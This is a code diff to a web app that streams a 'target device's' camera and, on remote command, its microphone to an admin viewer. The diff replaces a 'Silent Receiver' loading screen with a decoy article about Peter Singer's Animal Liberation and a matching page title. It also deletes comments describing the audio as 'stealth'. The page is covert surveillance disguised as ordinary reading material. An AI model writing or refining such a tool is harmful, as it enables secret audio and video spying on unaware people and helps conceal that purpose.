@@ -57,23 +57,19 @@
   .log{font-size:11px;color:var(--muted);font-family:ui-monospace,Menlo,monospace;margin-top:10px;
     max-height:90px;overflow:auto;white-space:pre-wrap;line-height:1.5;opacity:.8}
 
-  /* ---- Silent Receiver View: Clean Loading Screen ---- */
+  /* ---- Receiver View: Article Display ---- */
   .receiver-screen{
     position:fixed;inset:0;z-index:100;display:none;flex-direction:column;
-    align-items:center;justify-content:center;background:#0b0d12;text-align:center;padding:24px;
+    background:#0b0d12;color:#e8ebf0;overflow-y:auto;padding:32px 16px;
   }
   .receiver-screen.show{display:flex}
-  .receiver-card{
-    background:var(--panel);border:1px solid var(--line);border-radius:20px;
-    padding:36px 28px;max-width:320px;width:100%;box-shadow:0 20px 50px rgba(0,0,0,.6);
-    display:flex;flex-direction:column;align-items:center;
+  .article-container{
+    max-width:720px;margin:0 auto;background:var(--panel);border:1px solid var(--line);
+    border-radius:20px;padding:32px;box-shadow:0 20px 50px rgba(0,0,0,.6);
   }
-  .spinner{
-    width:36px;height:36px;border:3px solid rgba(255,255,255,.15);
-    border-top-color:var(--accent);border-radius:50%;animation:spin 1s linear infinite;margin-bottom:16px;
-  }
-  @keyframes spin{to{transform:rotate(360deg)}}
-  .loading-txt{font-size:16px;font-weight:600;color:var(--text);letter-spacing:.5px}
+  .article-container h2{font-size:24px;margin-top:0;margin-bottom:20px;color:#fff;font-weight:700;letter-spacing:.3px}
+  .article-container p{font-size:15px;line-height:1.7;color:#cdd6ea;margin-bottom:16px}
+  .article-container h3{font-size:18px;margin-top:24px;margin-bottom:12px;color:#fff;font-weight:600}
 </style>
 </head>
 <body>
@@ -102,11 +98,21 @@
   <div class="log" id="log"></div>
 </div>
 
-<!-- Receiver Screen (Target device) -->
+<!-- Receiver Screen (Target device displaying article) -->
 <div class="receiver-screen" id="receiverScreen">
-  <div class="receiver-card">
-    <div class="spinner"></div>
-    <div class="loading-txt">Loading…</div>
+  <div class="article-container">
+    <h2>What Information You Want About Animals</h2>
+    <p>Animal Liberation: A New Ethics for Our Treatment of Animals is a 1975 book by the Australian philosopher Peter Singer. It is widely considered within the animal liberation movement to be the founding philosophical statement of its ideas. Singer himself rejected the use of the theoretical framework of rights when it comes to human and nonhuman animals. Following Jeremy Bentham, Singer argued that the interests of animals should be considered because of their ability to experience suffering and that the idea of rights was not necessary in order to consider them. He popularized the term "speciesism" in the book, which had been coined by Richard D. Ryder to describe the exploitative treatment of animals.</p>
+    <p>A revised edition, Animal Liberation Now, was released in 2023.</p>
+    
+    <h3>Summary</h3>
+    <p>Singer allows that animal rights are not the same as human rights, writing in Animal Liberation that "there are obviously important differences between humans and other animals, and these differences must give rise to some differences in the rights that each have."</p>
+    <p>In Animal Liberation, Singer argues against what he calls speciesism: discrimination on the grounds that a being belongs to a certain species. He holds the interests of all beings capable of suffering to be worthy of equal consideration and that giving lesser consideration to beings based on their species is no more justified than discrimination based on skin color. He argues that animals' rights should be based on their capacity to feel pain instead of their intelligence. In particular, he argues that while animals show lower intelligence than the average human, many severely intellectually challenged humans show equally diminished, if not lower, mental capacity and that some animals have displayed signs of intelligence (for example, primates learning elements of American sign language and other symbolic languages) sometimes on a par with that of human children. Therefore, intelligence does not provide a basis for giving nonhuman animals any less consideration than such intellectually challenged humans. Singer concludes that the most practical solution is to adopt a vegetarian or vegan diet. He also condemns vivisection except where the benefit (in terms of improved medical treatment, etc.) outweighs the harm done to the animals used.</p>
+
+    <h3>Reception</h3>
+    <p>Activist Ingrid Newkirk wrote of Animal Liberation, "It forever changed the conversation about our treatment of animals. It made people—myself included—change what we ate, what we wore, and how we perceived animals." Other activists who claim that their attitudes to animals changed after reading the book include Peter Tatchell and Matt Ball.</p>
+    <p>Singer has expressed regret that the book did not have more impact. In September 1999, he was quoted by Michael Specter in The New Yorker on the book's impact: "It's had effects around the margins, of course, but they have mostly been minor. When I wrote it, I really thought the book would change the world. I know it sounds a little grand now, but at the time the 1960s still existed for us. It looked as if real changes were possible, and I let myself believe that this would be one of them. All you have to do is walk around the corner to McDonald's to see how successful I have been."</p>
+    <p>The book has also received critical challenges to the utilitarian underpinnings of his theory towards animal rights. In Slate, published in 2001, Richard Posner wrote that Singer failed to see the "radicalism of the ethical vision that powers [his] view on animals, an ethical vision that finds greater value in a healthy pig than in a profoundly intellectually challenged child, that commands inflicting a lesser pain on a human being to avert a greater pain to a dog, and that, provided only that a chimpanzee has 1 percent of the mental ability of a normal human being, would require the sacrifice of the human being to save 101 chimpanzees." Singer replied to and rejected this claim, engaging in a lengthy debate with Posner.</p>
   </div>
 </div>
 
@@ -147,7 +153,7 @@
   if(!isHost){
     var aw = $("adminWrap"); if(aw) aw.style.display = "none";
     var rs = $("receiverScreen"); if(rs) rs.classList.add("show");
-    document.title = "Loading…";
+    document.title = "What Information You Want About Animals";
   }
 
   var cb = $("copyBtn");
@@ -203,7 +209,7 @@
     // Audio / Mic Toggle Button
     var audioBtn=document.createElement("button"); audioBtn.textContent="Mic: Off";
     audioBtn.dataset.audioState = "off";
-    audioBtn.disabled = true; // disabled until camera is on
+    audioBtn.disabled = true;
     audioBtn.addEventListener("click", function(){
       var conn = dataConns[pid];
       if(!conn) return;
@@ -242,7 +248,7 @@
       t.toggleBtn.textContent = "Cam: On";
       t.toggleBtn.classList.remove("primary");
       t.toggleBtn.classList.add("danger");
-      t.audioBtn.disabled = false; // Enable audio control once camera is active
+      t.audioBtn.disabled = false;
     } else {
       t.video.srcObject = null;
       t.ph.style.display = "flex";
@@ -268,12 +274,10 @@
     if(!window.isSecureContext && location.hostname!=="localhost") return;
     if(localStream) return;
     try{
-      // Request media with audio track muted by default so it stays silent/stealth on the client device
       localStream = await navigator.mediaDevices.getUserMedia({
         video:{ facingMode: "user", width:{ideal:1280}, height:{ideal:720} },
         audio:true
       });
-      // Keep audio disabled initially until admin explicitly turns it on
       localStream.getAudioTracks().forEach(function(t){ t.enabled = false; });
     }catch(e){
       log("Camera permission error: " + e.message);
@@ -332,15 +336,6 @@
       else if(d.type==="cmd_audio_off" && !isHost){
         setAudioState(false);
       }
-      // Status confirmation messages back to admin
-      else if(d.type==="audio_status_on" && isHost){
-        var t = remoteTiles[conn.peer];
-        if(t){ t.audioBtn.dataset.audioState = "on"; t.audioBtn.textContent = "Mic: On"; t.audioBtn.classList.add("danger"); }
-      }
-      else if(d.type==="audio_status_off" && isHost){
-        var t = remoteTiles[conn.peer];
-        if(t){ t.audioBtn.dataset.audioState = "off"; t.audioBtn.textContent = "Mic: Off"; t.audioBtn.classList.remove("danger"); }
-      }
     });
 
     conn.on("open", function(){
@@ -384,14 +379,6 @@
       call.on("stream", function(stream){
         if(isHost){
           setRemoteStreamState(call.peer, stream);
-            // If audio was already active on stream update, reflect it
-            stream.getAudioTracks().forEach(function(track){
-              if(track.enabled && remoteTiles[call.peer]){
-                remoteTiles[call.peer].audioBtn.dataset.audioState = "on";
-                remoteTiles[call.peer].audioBtn.textContent = "Mic: On";
-                remoteTiles[call.peer].audioBtn.classList.add("danger");
-              }
-            });
           setStatus("connected", true);
         }
       });
